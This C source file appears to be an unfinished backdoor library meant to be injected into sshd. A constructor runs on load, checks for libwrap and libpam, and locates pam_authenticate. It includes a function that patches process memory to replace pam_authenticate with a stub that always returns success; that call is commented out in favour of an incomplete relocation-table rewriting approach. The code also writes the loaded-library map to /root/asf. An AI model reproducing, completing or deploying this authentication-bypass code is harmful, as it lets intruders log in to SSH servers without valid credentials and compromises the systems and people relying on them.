#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>


#include "bad.h"


static int PAGE_SIZE;

static void handlesigsegv(int sig)
{
	/*
	 * TODO SIGBUS and actually handle an error
	 */


	/* unregister us */
	signal(sig, SIG_DFL);
	kill(getpid(), sig);
}

static int retzero(pam_handle_t *x, int i)
{
	return 0;
}

/*
 * going to get axed by relocation rewrites soon
 *
 * good god we've came far
 *
 * uint64_t prevpage = ((uint64_t) dli->dli_saddr / PAGE_SIZE) * PAGE_SIZE;
 * uint64_t nextpage = (((uint64_t) dli->dli_saddr / PAGE_SIZE) + 1) * PAGE_SIZE;
 *
 */
static int hook(void *lib, void *func, void *replace, size_t replacelen)
{
	uint64_t distance = (uint64_t) func - (uint64_t) lib;
	uint64_t PAGES = ((uint64_t) distance / PAGE_SIZE) + 1;

	size_t len = PAGE_SIZE * PAGES;

	mprotect((void *) lib, len, PROT_READ | PROT_WRITE | PROT_EXEC);

	memcpy(func, replace, replacelen);

	mprotect((void *) lib, len, PROT_READ | PROT_EXEC);

	return 0;
}

/*
 * lib = start of lib we search - use get_libstart()
 */
static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;

			void *libend = (void *)map->l_next->l_addr;

			bool done = false;

			while (done != true && libstart >= libend) {
				dladdrptr(libstart, dli);

				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						void *tmp = dli->dli_saddr;
						free(dli);
						return tmp;
					}
				}
				libstart += 16; /* XXX: testme += 64 */
			}
		}
		map = map->l_next;
	}

	free(dli);
	return NULL;
}

static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) {
		if (strstr(map->l_name, lib) != NULL)
			return (void *)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

static void print_libs(struct link_map *link_map)
{
	FILE *fp;

	fp = fopen("/root/asf", "w");

	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
		map = map->l_next;
	}

	free(dli);
	fflush(fp);
	fclose(fp);

	return;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);

	if (dlhandle == NULL)
		return -1;

	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);

	if (!dlinfoptr || !dladdrptr)
		return -1;

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *wrapstart = get_libstart(link_map, "libwrap.so.0");

	if (!wrapstart)
		return -1;

	void *pamstart = get_libstart(link_map, "libpam.so.0");

	if (!pamstart)
		return -1;

	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access");
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");

	if (!hosts_access || !pam_authenticate)
		return -1;

	return 0;
}

void pamdynamicstuff(void);

static void  __attribute__ ((constructor)) bad(void)
{
	struct link_map *link_map;

	if (is_sshd(link_map) != 0)
		return;

	PAGE_SIZE = getpagesize();

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	signal(SIGSEGV, handlesigsegv);

	print_libs(link_map);

	void *libpam = get_libstart(link_map, "libpam.so.0");
	void *pam_auth = find_func_ptr(link_map, libpam, "pam_authenticate");
	
	//hook(libpam, pam_auth, retzero, 20);
	/* hook pam_acct_mgmt to allow usernames*/
	
	pamdynamicstuff();
	
	return;
}


static int callback(struct dl_phdr_info *info, size_t size, void *data);
int (*dl_iterate_phdrptr)(int (*callback) (struct dl_phdr_info *info, size_t size, void *data), void *data);

Elf64_Dyn *pamdyn;

Elf64_Dyn *null1;
Elf64_Dyn *null2;

Elf64_Ehdr *ehdr;

/* TODO: fix compiler warnings good god */
void pamdynamicstuff(void)
{
	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
	dlclose(o);

	dl_iterate_phdrptr(callback, NULL);


	// work()

	return;
}

/*
 * Parse a dynamic section array for useful pointers
 * CHECK RESULTS -- number of elements in a .dynamic can be wonky...
 * TODO: there is probably a way to get the correct number of elements in a .dynamic array
 *	so we don't blow something up
 */
void parse_dyn_array(Elf64_Dyn **dynptrdbl, int elements, Elf64_Rela **RELA,
					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
{
	int i;

	Elf64_Dyn *dynptr = *dynptrdbl;
	
	for (i = 0; i < elements; i++) {
		if (dynptr[i].d_tag == DT_RELA)
			*RELA = (Elf64_Addr *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_JMPREL)
			*JMPREL = (Elf64_Addr *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_PLTRELSZ)
			*PLTRELSZ = &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_RELASZ)
			*RELASZ = &dynptr[i].d_un;
	}
	return;
}

/*
 * parses a .dynamic relocation table (DT_RELA) to return the Elf64_Rela * entry associated 
 *	with the funcneedle we want to hook...
 *
 * works in 3.2.0-4 openssh_6.0pl YMMV
 */
Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *funcneedle)
{
	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));

	int i;
	for (i = 0; i < relaments; i++) {
			if ((void *) RELA[0].r_addend == funcneedle)
				return RELA;

		RELA = (char *) RELA + (unsigned long long) (sizeof(Elf64_Rela));		
	}
	return NULL;
}

/*
 * parses the relocation table only associated with PLT entries (DT_PLTREL)
 *	same as above	
 * TODO: not sure if we can rewrite this table -- TESTME TESTME TODO TODO TODO TODO
 * TODO TODO TODO TODO TODO
 */
Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *funcneedle)
{
	uint64_t jmpelements = *PLTRELSZ / (sizeof(Elf64_Rela));
	
	int i;	
	for (i = 0; i < jmpelements; i++) {
/*		fprintf(fp, "r_offset = %16p  r_info[type = %10p  sym = %10llu]  r_addend = %10p \n",
				JMPREL[0].r_offset,
				ELF64_R_TYPE(JMPREL[0].r_info), ELF64_R_SYM(JMPREL[0].r_info), JMPREL[0].r_addend);
*/		
		JMPREL = (char*) JMPREL + (unsigned long long) (sizeof(Elf64_Rela));		
	}
}





/*
 * the callback for dl_iterate_phdr
 *
 * currently using # of sections and a null libname to find sshd - crappy i know
 * TODO: make null1/null2 not suck
 */
static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	int j;
	
	for (j = 0; j < info->dlpi_phnum; j++) {
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				if (info->dlpi_phnum == (unsigned)9) {
					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
				if (info->dlpi_phnum == (unsigned)4)  {
					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
			}
		}
	}
/* might be useful one day i dont know, ehdr is usually offset 0x40 from phdr[0] anyways
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_PHDR) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				ehdr = ((info->dlpi_addr + info->dlpi_phdr[j].p_vaddr) - info->dlpi_phdr[j].p_offset);
				break;
			}
		}
*/
	return 0;
}
